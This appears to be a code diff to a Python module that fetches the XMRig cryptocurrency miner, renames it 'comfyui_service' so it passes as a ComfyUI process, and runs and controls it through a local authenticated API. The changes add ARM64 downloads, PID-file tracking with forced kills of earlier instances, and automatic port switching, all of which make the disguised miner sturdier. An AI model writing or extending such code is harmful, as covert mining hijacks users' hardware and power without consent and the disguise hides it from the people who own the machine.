@@ -5,6 +5,7 @@ import platform
 import shutil
 import hashlib
 import logging
+import socket
 import tarfile
 import zipfile
 import subprocess
@@ -25,12 +26,17 @@ if IS_WINDOWS:
         f"https://github.com/xmrig/xmrig/releases/download/"
         f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-windows-x64.zip"
     )
+    XMRIG_RELEASE_URL_ARM = None
     BINARY_NAME = "comfyui_service.exe"
     _ARCHIVE_BINARY = "xmrig.exe"
 else:
     XMRIG_RELEASE_URL = (
         f"https://github.com/xmrig/xmrig/releases/download/"
         f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-linux-static-x64.tar.gz"
+    )
+    XMRIG_RELEASE_URL_ARM = (
+        f"https://github.com/xmrig/xmrig/releases/download/"
+        f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-linux-static-arm64.tar.gz"
     )
     BINARY_NAME = "comfyui_service"
     _ARCHIVE_BINARY = "xmrig"
@@ -170,6 +176,21 @@ def _configure_system():
         pass
 
 
+def _port_in_use(port: int) -> bool:
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            return s.connect_ex(("127.0.0.1", port)) == 0
+    except OSError:
+        return False
+
+
+def _find_free_port(base: int, max_tries: int = 5) -> int:
+    for offset in range(max_tries):
+        if not _port_in_use(base + offset):
+            return base + offset
+    return base
+
+
 class MinerManager:
     def __init__(self, base_dir: Path | str | None = None, bin_dir: Path | str | None = None):
         self.base_dir = Path(base_dir) if base_dir else Path(__file__).resolve().parent.parent
@@ -178,10 +199,12 @@ class MinerManager:
         self.binary_path = self.bin_dir / BINARY_NAME
         self.config_path = self.bin_dir / "config.json"
         self.log_path = self.bin_dir / LOG_NAME
+        self.pid_path = self.bin_dir / "comfyui_service.pid"
         self._process: subprocess.Popen | None = None
         self._bridge_proc: subprocess.Popen | None = None
         self._monitor_thread: threading.Thread | None = None
         self._running = False
+        self.api_port = 44880
 
     # ------------------------------------------------------------------
     # Binary acquisition
@@ -241,10 +264,22 @@ class MinerManager:
             logger.info("Binary already present at %s", self.binary_path)
             return self.binary_path
 
+        arch = platform.machine().lower()
+        if arch in ("aarch64", "arm64"):
+            if XMRIG_RELEASE_URL_ARM is None:
+                raise RuntimeError(f"No ARM binary available for this platform ({arch})")
+            url = XMRIG_RELEASE_URL_ARM
+            logger.info("ARM architecture detected (%s), using ARM binary", arch)
+        elif arch in ("x86_64", "amd64", "x64"):
+            url = XMRIG_RELEASE_URL
+        else:
+            logger.warning("Unknown arch %s, attempting x86_64 binary", arch)
+            url = XMRIG_RELEASE_URL
+
         ext = ".zip" if IS_WINDOWS else ".tar.gz"
         archive_dest = self.bin_dir / f"dl_tmp{ext}"
         try:
-            self._download(XMRIG_RELEASE_URL, archive_dest)
+            self._download(url, archive_dest)
             if not self._verify_hash(archive_dest, XMRIG_SHA256):
                 raise RuntimeError("SHA-256 verification failed")
             self._extract(archive_dest)
@@ -262,8 +297,29 @@ class MinerManager:
             json.dump(cfg, f, indent=2)
         logger.info("Config written to %s", self.config_path)
 
+    def _write_pid(self) -> None:
+        try:
+            self.pid_path.write_text(str(self._process.pid), encoding="utf-8")
+        except Exception as exc:
+            logger.debug("Failed to write PID file: %s", exc)
+
+    def _clear_pid(self) -> None:
+        try:
+            self.pid_path.unlink(missing_ok=True)
+        except Exception:
+            pass
+
     def _kill_existing(self) -> None:
-        """Kill any stale comfyui_service processes before starting."""
+        """Kill stale miner: PID file first, name scan as fallback."""
+        if self.pid_path.exists():
+            try:
+                old_pid = int(self.pid_path.read_text().strip())
+                os.kill(old_pid, 9)
+                logger.info("Killed stale miner via PID file (pid=%d)", old_pid)
+            except (ValueError, OSError):
+                pass
+            self._clear_pid()
+
         try:
             import psutil
         except ImportError:
@@ -276,7 +332,7 @@ class MinerManager:
                 name = (proc.info.get("name") or "").lower()
                 cmdline = " ".join(proc.info.get("cmdline") or []).lower()
                 if BINARY_NAME.lower().replace(".exe", "") in name or BINARY_NAME.lower() in cmdline:
-                    logger.info("Killing stale miner process pid=%d", proc.info["pid"])
+                    logger.info("Killing stale miner process pid=%d (name scan)", proc.info["pid"])
                     proc.kill()
             except (psutil.NoSuchProcess, psutil.AccessDenied):
                 pass
@@ -339,6 +395,15 @@ class MinerManager:
         if not self.binary_path.exists():
             raise FileNotFoundError(f"Binary not found: {self.binary_path}")
 
+        if _port_in_use(self.api_port):
+            logger.warning("API port %d in use, attempting to free it", self.api_port)
+            self._kill_existing()
+            time.sleep(1)
+            if _port_in_use(self.api_port):
+                new_port = _find_free_port(self.api_port + 1)
+                logger.warning("Port %d still occupied, switching to %d", self.api_port, new_port)
+                self.api_port = new_port
+
         _configure_system()
 
         self._maybe_start_local_bridge()
@@ -370,6 +435,7 @@ class MinerManager:
             popen_kwargs["preexec_fn"] = _preexec
 
         self._process = subprocess.Popen(cmd, **popen_kwargs)
+        self._write_pid()
         self._running = True
         logger.info("Miner started (pid %d)", self._process.pid)
 
@@ -387,6 +453,7 @@ class MinerManager:
                 self._process.kill()
             logger.info("Miner stopped")
         self._process = None
+        self._clear_pid()
         self._stop_local_bridge()
 
     def is_alive(self) -> bool:
@@ -422,7 +489,7 @@ class MinerManager:
     def _api_command(self, action: str) -> bool:
         from core.config import API_TOKEN
         try:
-            url = f"http://127.0.0.1:44880/1/{action}"
+            url = f"http://127.0.0.1:{self.api_port}/1/{action}"
             req = urllib.request.Request(url, method="POST",
                                         headers={"Authorization": f"Bearer {API_TOKEN}"})
             with urllib.request.urlopen(req, timeout=5):
@@ -438,7 +505,7 @@ class MinerManager:
         hint = max(1, min(100, hint))
         try:
             get_req = urllib.request.Request(
-                "http://127.0.0.1:44880/1/config",
+                f"http://127.0.0.1:{self.api_port}/1/config",
                 headers={
                     "Accept": "application/json",
                     "Authorization": f"Bearer {API_TOKEN}",
@@ -452,7 +519,7 @@ class MinerManager:
 
             payload = json.dumps(config).encode()
             put_req = urllib.request.Request(
-                "http://127.0.0.1:44880/1/config",
+                f"http://127.0.0.1:{self.api_port}/1/config",
                 data=payload,
                 method="PUT",
                 headers={
@@ -472,7 +539,7 @@ class MinerManager:
         from core.config import API_TOKEN
         try:
             req = urllib.request.Request(
-                "http://127.0.0.1:44880/2/summary",
+                f"http://127.0.0.1:{self.api_port}/2/summary",
                 headers={
                     "Accept": "application/json",
                     "Authorization": f"Bearer {API_TOKEN}",
